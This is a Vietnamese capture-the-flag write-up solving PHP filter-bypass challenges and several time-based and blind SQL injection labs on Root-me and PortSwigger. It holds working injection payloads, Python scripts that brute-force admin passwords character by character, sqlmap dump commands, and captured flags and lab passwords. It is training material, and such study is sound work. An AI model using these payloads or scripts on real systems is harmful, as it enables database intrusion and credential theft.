# Trần Mạnh Huy - Task3

* [1. Chết.vn](#1-chếtvn)
* [2. Root me - SQL injection - Time based](#1-root-me---sql-injection---time-based)
* [3. Portswigger: Blind SQL injection with time delays and information retrieval](#2-portswigger-blind-sql-injection-with-time-delays-and-information-retrieval)
* [4. Root me - SQL injection - Blind](#4-root-me---sql-injection---blind)


## 1. Chết.vn

### Chall 1: 

![image](https://user-images.githubusercontent.com/104350480/221727974-2fd7cd07-a715-4e41-9cc0-60ffb88322b0.png)

Ctrl U ta được flag:

> flag: FLAG{ddf1ea89-cd89-4da3-98bc-08028ac4dc7e}

### Chall 2: 

![image](https://user-images.githubusercontent.com/104350480/221728084-3dba666b-4646-4d28-ad12-da89ca8561d3.png)

Ta cho vào php decode ngược lại: 

```
<?php
$a = '1wc39mNzY4NDE1NTk9JD5vbm0mNDQ0PSQ5MHU9L2g+YHQ2NTB7dF5JU1';
echo str_rot13(hex2bin(strrev(bin2hex(base64_decode($a)))));
// echo base64_encode(hex2bin(strrev(bin2hex(str_rot13(print_flag(2))))))); 

```

> FLAG{c564ca8b-5c94-4446-aba4-955148676bfc}

### Chall 3: 

![image](https://user-images.githubusercontent.com/104350480/221728668-92629b02-0bc6-4072-925b-0fe12562a26e.png)

Dạng php juggling, ta chỉ cần truyền vào tham số ?number=+1337 hoặc ?number=%201337 

> FLAG{554382f3-960e-4859-9c79-c64ecd4445e7}

### Chall 4: 

![image](https://user-images.githubusercontent.com/104350480/221728934-e6677462-8ad2-40ec-9061-a67f0c0027e2.png)

Vì giá trị md5 ở dưới cần so sánh nghiêm ngặt nên 1 số trick về so sánh lỏng lẻo như dưới kh dùng được:

![image](https://user-images.githubusercontent.com/104350480/221729194-b6c245d9-242a-449c-995e-c9b836ec30be.png)

Ở đây ta có thể truyền vào ?0[]=1&1[]=2 để bypass điều kiện dưới vì md5 chỉ tính toán giá trị băm của 1 chuỗi nên sẽ trả về lỗi giống nhau.

> FLAG{82104890-f270-4d27-b4e4-638a940ffdcf}

### Chall 6: 

![image](https://user-images.githubusercontent.com/104350480/221729832-ba709207-cdc8-4bcc-8545-fa6aed969a11.png)

Bài này cần truyền tham số number vào, mà bị preg_match lọc mất, ta có thể bypass bằng cách dùng 1 mảng truyền vào, vì preg_match sẽ kiểm tra 1 chuỗi kí
tự chứ không lọc được mảng. Ta truyền vào giá trị: **?number[0]=1** , thỏa mãn điều kiện trên và dưới.

> FLAG{2352ca3b-c94e-450b-b69a-1938cab26571}

### Chall 8:

![image](https://user-images.githubusercontent.com/104350480/221731358-f6f6314b-50f4-4790-8791-55fdb4e33111.png)

Để ý thì sau khi truyền xong thì sẽ đi qua preg_match nhưng qua nó thì sẽ có 1 lần url decode, vậy ta encode url 2 lần là được
Ta truyền vào: ?u=**%2561dmin**

> FLAG{0406eb88-39ce-4dcc-bace-b058a7e57dd0}

### Chall 9:

![image](https://user-images.githubusercontent.com/104350480/221737560-e9e48fe2-e7fa-42bf-83f8-40a41cc3e695.png)

Bài này giới hạn kí tự truyền vào là 28 nên chuyển về hex cũng kh ổn, nhưng mà ngồi nghiên cứu 1 lúc thì ngẫm ra 1 cái khá hay là regexp preg_match() 
trong bài nó sẽ chỉ check dòng đầu tiên thôi, thế nếu ta làm nó xuống dòng được thì sao, tất nhiên là với nội dung **give_me_the_flag** rồi.
Ở đây ta dùng %0A để xuống dòng. Ta truyền vào với nội dung: **a%0Agive_me_the_flag** , như vậy là bypass thành công.

> FLAG{62e0d117-93af-4e36-957c-3841d1ae7100}

## 2. Root me - SQL injection - Time based

Vừa vào ta có giao diện:

![image](https://user-images.githubusercontent.com/104350480/221471713-d5066bc2-5f56-4f6a-81e8-098d3d375121.png)

Thử ở phần login nhưng có vẻ kh khai thác được gì, ta sang phần memberlist:

![image](https://user-images.githubusercontent.com/104350480/221471797-8014ce54-8754-4363-bffc-3c3ffd0988fa.png)

Nhấn vào admin với url: **http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1** , vì là dạng time-based nên ta cần test sleep để xem có bị dính sql không. Sau một hồi thử thì ta sleep được vói dạng của nó là postgresql: 

> payload: http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;+select+pg_sleep(10) --

Xác định được rồi giờ ta sẽ đi tìm tên bảng, tên cột và thông tin cần, cụ thể ở đây sẽ là tìm được administrator password với dạng payload chung:

> SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END

![image](https://user-images.githubusercontent.com/104350480/221472507-a9b47bc2-01e9-4b72-88ed-6e8226cd219e.png)

Đầu tiên là cần tìm bảng, trước hết thì sẽ làm tìm độ dài của bảng:

> /web-serveur/ch40/?action=member&member=1;+select+case+when+((select+LENGTH(table_name)+from+information_schema.tables+limit+1)+>1)+then+pg_sleep(10)+else+pg_sleep(0)+end+-- 

Đi thử thế này sẽ rất là mất thời gian vì ta đang để limit trả về 1 với offset mặc định là 0, mà chẳng hạn bảng hay cột ta cần tìm ở cột thứ 6 hay 7 chẳng hạn thì thử sẽ mất kha khá thời gian. Mà để hiểu bản chất thì đành vậy.

Với payload trên ta sẽ kiểm tra xem độ dài chính xác của table_name ở hàng 1 là bao nhiêu, test đến khi > 5 kh thấy sleep nữa thì ta được độ dài của bảng là 5.
Với length=5, giờ ta đi tìm tên bảng bằng cách dùng SUBSTRING để đi bruteforce từng kí tự 1, cái này thì dùng burpsuite cho nhanh.
Nhưng đến khi dùng substring để tìm kí tự thì ta lại gặp vấn đề là kh sleep nữa dù payload đã chính xác:

> 1;+select+case+when+(SUBSTRING((select+table_name+from+information_schema.tables+limit+1),1,1)+>+'a')+then+pg_sleep(10)+else+pg_sleep(0)+end+--

Có vẻ '',"" đã bị filter trong bài này, vậy thì ta sẽ chuyển sang dạng chr hoặc hex thử xem:

> 1;+select+case+when+(SUBSTRING((select+table_name+from+information_schema.tables+limit+1),1,1)+>+chr(97))+then+pg_sleep(10)+else+pg_sleep(0)+end+--

Oke vậy là đã sleep được, ta sẽ triển khai tiếp bằng cách bruteforce các kí tự char.

![image](https://user-images.githubusercontent.com/104350480/221474078-c546ad59-df4f-4497-ade5-76b248a4e266.png)

> Sau khi fuzz ta được tên bảng ứng với các kí tự char là: 117,115,101,114,115 chuyển về ta được tên bảng là users

![image](https://user-images.githubusercontent.com/104350480/221477066-6360b685-32f7-4c28-9519-4db0ebadfbaa.png)


Ta có được tên bảng, giờ đi tìm username với password thôi.
Tương tự như trên ta đi xác định column password. Bài này filter cả dấu ',' nên kh thể dùng limit 1,1 hay 2,1 được, ta sẽ thay thế bằng offset với chức năng tượng tự. Thử cái đầu tiên với offset = 1, kh phải cái ta được tên cột là username với payload như bên dưới: 

> payload1: 1;+select+case+when+(select+length(column_name)+from+information_schema.columns+limit+1+offset+1)+>+1)+then+pg_sleep(10)+else+pg_sleep(0)+end+--
> payload2: 1;+select+case+when+(substring(select+(column_name)+from+information_schema.columns+limit+1+offset+1),1,1)+=+chr(x))+then+pg_sleep(10)+else+pg_sleep(0)+end+--

Với length = 8 và bruteforce từng kí tự được: 

![image](https://user-images.githubusercontent.com/104350480/221482081-946047e6-2245-42c7-af12-6cc9fd46934e.png)

Tương tự ta cần tìm cột chứa thông tin password, cứ tiếp tục như trên đến khi offset = 5 ta được: 

![image](https://user-images.githubusercontent.com/104350480/221480820-c50769a7-8635-40ad-aa99-53ba1d364f45.png)

Vậy tìm được tên column ở hàng thứ 5 là password với tên bảng usesrs, mục tiêu là tìm password của username là administrator nên ta tiếp tục lấy giá trị của password ra: 

> payload: 1;+select+case+when+((select length(password) from users+limit+1)>1)+then+pg_sleep(20)+else+pg_sleep(0)+end+--

Thử như vậy ta được length của password hàng 1 có độ dài là 13, vì password có thể là các kí tự hoa và kí tự đặc biệt nên ta sẽ phải thử chr từ 33 đến 126.
Dùng 2 payload với burpsuite để tìm kiếm:

![image](https://user-images.githubusercontent.com/104350480/221502821-a5ca2dc9-c0b9-4da7-9641-25ac7f8069b2.png)


## Nhưng bằng cách trên mình thấy bruteforce bằng burpsuite rất lâu, nên ta viết script như sau sẽ nhanh hơn nhiều:  

```
import requests
import string
import time
url='http://challenge01.root-me.org/web-serveur/ch40/'
passwd = ''
i=1
for i in range(1,14):
    for c in range(33,127):
        payload = f"1; select case when (substring((select (password) from users limit 1),{i},1) = chr({c})) then pg_sleep(5) else pg_sleep(0) end --"
        params = {'action':'member','member':payload}
        start = time.time()
        r=requests.get(url,params=params)
        end = time.time()  
        response_time = end - start
        if response_time > 2:
            print("count: ", i)
            print("c :",c)
	    text = chr(c)
	    passwd+=text
            break
print(passwd)

```
![image](https://user-images.githubusercontent.com/104350480/221499083-ac672ca7-1be4-443d-a309-a9a29f874425.png)

Ta chuyển đổi về dạng char về text thì được : T!m3B@s3DSQL!

### Một cách khác nữa là ta dùng sql map cho nhanh, khi hiểu được cách làm r thì dùng tool thôi :(((

> sqlmap -u 'http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1' --dbs

![image](https://user-images.githubusercontent.com/104350480/221501331-768f805e-35f4-4e93-915d-8baffd125199.png)

> sqlmap -u 'http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1' --dbms=PostgreSQL --tables --threads=10 --batch

![image](https://user-images.githubusercontent.com/104350480/221501670-d408b10e-e9e3-42de-ba75-a079405918d8.png)

> sqlmap -u 'http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1' --dbms=PostgreSQL -T users --columns --threads=10 --batch

![image](https://user-images.githubusercontent.com/104350480/221502477-e1628c4e-5641-4f03-ab79-4707838a1325.png)


> sqlmap -u 'http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1' --dbms=PostgreSQL -T users -C password --dump --threads=10 --batch

![image](https://user-images.githubusercontent.com/104350480/221502624-cc8a2c17-34f9-489b-89e8-dca18b04de81.png)

Ta cũng có được password: T!m3B@s3DSQL!

## 3. Portswigger: Blind SQL injection with time delays and information retrieval

Bài này thì ý tưởng vẫn tương tự bài trên, ta sẽ đi bruteforece từng cái một, đầu tiên là table_name là users, tiếp đến là column_name là username và password
Sau khi có được username = 'administrator' ta sẽ tìm password tương ứng. Ở đây sẽ lần lượt dùng burpsuite, script và cả sqlmap để giải quyết bài này.

Đầu tiên như trên ta làm lần lượt với burpsuite trước. Bài này cũng giống như các bài blind trước, ta tiêm vào phần TrackingId
Trước hết là thực hiện test sleep() xem thuộc dạng nào thì bài này thử với pg_sleep() nó hoạt động nên dbs là postgresql

> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+pg_sleep(10)+--

Test điều kiện: 

> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when(1=1)+then+pg_sleep(10)+else+pg_sleep(0)+end+--

Kiểm tra độ dài của table_name hàng 1:

> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when((select+length(table_name)+from+information_schema.tables+limit+1)>1)+then+pg_sleep(10)+else+pg_sleep(0)+end+--

Ta tìm ra được độ dài là: 5. Tiếp tục sử dụng substring() để tìm kiếm từng kí tự: 

> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when(substring((select+table_name+from+information_schema.tables+limit+1),1,1)>'a')+then+pg_sleep(10)+else+pg_sleep(0)+end+--

![image](https://user-images.githubusercontent.com/104350480/221527342-9d218404-92a6-4dcc-9319-0957e55723fa.png)

Cho vào burp intruder,ta được bảng có tên là users. Tiếp tục payload tìm kiếm cột. Vì bài này chẳng filter gì nên ta cứ thế làm như bình thường:

> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when((select+length(column_name)+from+information_schema.columns+where+table_name='users'+limit+1)>1)+then+pg_sleep(10)+else+pg_sleep(0)+end+--

Ta tìm được độ dài của cột 1 là 8, substring tương tự như trên ta được cột thứ 1 là username

![image](https://user-images.githubusercontent.com/104350480/221529276-eba9d382-1844-4bd0-b70f-efc8666fbe7f.png)

Tương tự ta tìm được cột 2 cũng là 8 bằng cách thêm offset 1 ở sau limit 1, substring tương tự ta được cột thứ 2 là password: 

![image](https://user-images.githubusercontent.com/104350480/221529730-4ab64162-55b9-4aea-acf0-efb4678ecb64.png)

Khi ta có được 2 cột là username và password ta sẽ kiếm xem ở đâu có username là 'administrator'. Ta có payload: 

> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when((select+length(username)+from+users+limit+1)>1)+then+pg_sleep(10)+else+pg_sleep(0)+end+--

Ta tìm được độ dài là 13, substring ra được luôn tên là administrator. 

> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when(substring((select+username+from+users+limit+1),§1§,1)='§a§')+then+pg_sleep(10)+else+pg_sleep(0)+end+-- 

![image](https://user-images.githubusercontent.com/104350480/221531115-d36ce016-f34e-415b-94ea-92ef7ab3f836.png)

Giờ tìm nốt password tương ứng: 

> Cookie: TrackingId=z8gpmSjNfugquqLX'%3bselect+case+when((select+length(password)+from+users+where+username='administrator')>1)+then+pg_sleep(10)+else+pg_sleep(0)+end+--

Ta tìm được độ dài của password là 20. Tiếp tục cho vào burp intruder với substring để tìm từng kí tự ta được: 

![image](https://user-images.githubusercontent.com/104350480/221532407-ba867c88-b865-4a0e-9744-abe3c9b603ee.png)

> Vậy password của administrator trong bài lab là: aon10t6tnj02e4sfpb7u


Tương tự ta dùng sqlmap để giải: 

> payload:  sqlmap -u "https://0a1d00120454efcbc020e5f8000d0071.web-security-academy.net/filter?category=Lifestyle" --cookie="TrackingId=JHeMMMt7qJmqCCdn*;" -p "TracingId" --proxy http://127.0.0.1:8080 --dbs -batch 

![image](https://user-images.githubusercontent.com/104350480/221622642-f2fc5924-5365-4a6c-bf9d-f92c923d0b69.png)

Có dbms=PostgreSQL và tên database là public. Tìm table

> payload: sqlmap -u "https://0a1d00120454efcbc020e5f8000d0071.web-security-academy.net/filter?category=Lifestyle" --cookie="TrackingId=JHeMMMt7qJmqCCdn*;" -p "TracingId" --proxy http://127.0.0.1:8080 --dbms=PostgreSQL --tables --threads=10 -batch

![image](https://user-images.githubusercontent.com/104350480/221623117-be978b20-1120-454e-84df-538be78bddb9.png)

Có 2 table, ta fuzz table users, tiếp tục tìm cột: 

> payload: sqlmap -u "https://0a1d00120454efcbc020e5f8000d0071.web-security-academy.net/filter?category=Lifestyle" --cookie="TrackingId=JHeMMMt7qJmqCCdn*;" -p "TracingId" --proxy http://127.0.0.1:8080 --dbms=PostgreSQL -D public -T users --column --threads=10 -batch

Ta được 2 cột trả về là username và password:

![image](https://user-images.githubusercontent.com/104350480/221623390-40150047-ba57-4ba1-b1c7-9565f149d2f9.png)

Tiếp tục fuzz cột username: 

> payload: sqlmap -u "https://0a1d00120454efcbc020e5f8000d0071.web-security-academy.net/filter?category=Lifestyle" --cookie="TrackingId=JHeMMMt7qJmqCCdn*;" -p "TracingId" --proxy http://127.0.0.1:8080 --dbms=PostgreSQL -D public -T users -C username --dump --threads=10 -batch

![image](https://user-images.githubusercontent.com/104350480/221623663-5aad9aeb-708e-4814-b432-785a739f6f40.png)

Cuối cùng là password:

> payload: sqlmap -u "https://0a1d00120454efcbc020e5f8000d0071.web-security-academy.net/filter?category=Lifestyle" --cookie="TrackingId=JHeMMMt7qJmqCCdn*;" -p "TracingId" --proxy http://127.0.0.1:8080 --dbms=PostgreSQL -D public -T users -C password --dump --threads=10 -batch

![image](https://user-images.githubusercontent.com/104350480/221623907-5741eab2-7d90-420d-b1d3-922d1d274327.png)

#### Ta cũng có được password của administrator là: rnhh118d91xe1e3raoee

## 4. Root me - SQL injection - Blind

Bài cho ta 1 form đăng nhập: 

![image](https://user-images.githubusercontent.com/104350480/221755192-b5f75044-b415-40ef-8ca8-a4ae2574ae4e.png)

Trước hết thử nhập lỗi xem sao: **a'abcd1234 --** ta được lỗi trả về với dbms là sqlite3:

![image](https://user-images.githubusercontent.com/104350480/221755865-291f1ab0-0355-4ad5-b00a-f62b8c97f234.png)


Thử payload cổ điển xem sao, **username=abcd' or 1=1 -- - &password=1**, ta được user1 trả về:

![image](https://user-images.githubusercontent.com/104350480/221755354-6a35b108-1802-43f1-9392-4f276ac69150.png)

Tiếp tục thử payload khác xem có users nào khác không với payload: **username=abcd' or 1=1 and username not like 'user1%' -- - &password=1**, ta được 
username là admin trả về: 

![image](https://user-images.githubusercontent.com/104350480/221755640-5e1423fe-1453-4f5c-bd64-724ec7a5a761.png)

Cái ta cần là password, ta thử union kiểm tra xem có bao nhiêu cột: 

![image](https://user-images.githubusercontent.com/104350480/221755942-2273371e-cbef-4604-89e5-3b9ef19ce3e6.png)

Có vẻ union bị filter mất rồi, vậy là không thể dùng được union ở bài này. Ở đây ta phải dùng cách khác, thế thì mình dùng toán tử and thôi

Thử substr thông thường kh được, mà dùng chr cũng báo lỗi, kh biết sao nữa, nhưng chuyển về dạng hex thì lại được:

Script tìm table name:

```
import requests
import string
sess=requests.Session()
url='http://challenge01.root-me.org/web-serveur/ch10/'
payload=string.printable
passwd=''   
i=1
while True:
    for c in payload: 
        table={
            'username':f"user1' and (SELECT hex(substr(tbl_name,{i},1)) FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('{c}') -- -",
            'password':'pass'
        }
 
        r=sess.post(url,data=table)
        if "Welcome back" in r.text:
            passwd+=c
            i+=1
            print(passwd)
            break
            
```
Ta được table_name là users. Tiếp tục fuzz password với username ta cần là admin: 

Script:

```
import requests
import string
sess=requests.Session()
url='http://challenge01.root-me.org/web-serveur/ch10/'
payload=string.printable
passwd=''   
i=1
while True:
    for c in payload: 
        password={
            'username':f"admin' and substr((select password from users where (username='admin')),{i},1)='{c}'--",
            'password':'1'
        }
        r=sess.post(url,data=password)
        if "Welcome back" in r.text:
            passwd+=c
            i+=1
            print(passwd)
            break
```
![image](https://user-images.githubusercontent.com/104350480/221758989-00ef6ed7-d0a2-4233-94e3-335843732eef.png)

> passwrod: e2azO93i


### Bài này ta cũng có thể dùng sqlmap để tìm kiếm: 


